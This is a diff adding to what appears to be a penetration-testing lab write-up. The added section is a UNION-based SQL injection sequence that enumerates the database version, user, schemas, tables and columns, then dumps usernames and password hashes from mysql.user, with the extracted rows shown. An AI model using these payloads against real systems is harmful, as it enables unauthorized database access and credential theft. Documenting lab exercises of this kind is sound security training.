@@ -629,6 +629,52 @@ Proxy settings: Created session handling rule
   	Scope -> URL Scope -> Include all URLs
 ![image](https://github.com/user-attachments/assets/119875e0-a527-4c3c-8db3-bf6732c215f3)
 
+' UNION select 1,@@version,3,4,5,6-- -
+
+![image](https://github.com/user-attachments/assets/47119120-9115-494c-b3e3-05ead2e24c1c)
+
+' UNION select 1,user(),3,4,5,6-- -
+
+![image](https://github.com/user-attachments/assets/1e918d8e-080f-4deb-b100-b63bfecdeda0)
+
+' UNION select 1,schema_name,3,4,5,6 from INFORMATION_SCHEMA.SCHEMATA-- -
+
+![image](https://github.com/user-attachments/assets/b8cabf98-9d33-46f7-8e27-2b49c8d80d6f)
+
+' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5,6 from INFORMATION_SCHEMA.TABLES where table_schema='warehouse'-- -
+
+![image](https://github.com/user-attachments/assets/189b4de4-2fa0-49ec-aad7-7603d6db24a6)
+
+' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5,6 from INFORMATION_SCHEMA.TABLES where table_schema='mysql'-- -
+
+![image](https://github.com/user-attachments/assets/876c880a-ba83-4aa1-8608-064515cfd148)
+![image](https://github.com/user-attachments/assets/958291f8-4282-48a5-acde-734a60fae877)
+![image](https://github.com/user-attachments/assets/6dacfba3-d0c4-4363-b0d9-9db873f8ccb5)
+
+' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5,6 from INFORMATION_SCHEMA.COLUMNS where table_name='user'-- -
+
+![image](https://github.com/user-attachments/assets/fecab751-3500-4c5d-8f87-68ff2ba08cfc)
+![image](https://github.com/user-attachments/assets/d53e6e9e-bbe4-4274-83f9-21fafaf68c9c)
+![image](https://github.com/user-attachments/assets/da8e6433-7e3f-4259-a40d-177734081e25)
+![image](https://github.com/user-attachments/assets/dbe115b1-bd98-44d6-9531-72465646440d)
+
+' UNION select 1, user, password, 4, 5, 6 from mysql.user-- -
+
+![image](https://github.com/user-attachments/assets/af0e85ba-5572-4505-bb1b-ef33ce2735e5)
+
+Products
+Id	Name	Quantity	Category	Price
+1	root	*0A4A5CAD344718DC418035A1F4D292BA603134D8	4	5	6
+1	manager	*CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA	4	5	6
+1	hector	*0E178792E8FC304A2E3133D535D38CAF1DA3CD9D	4	5	6
+
+
+
+
+
+
+
+
 
 
 
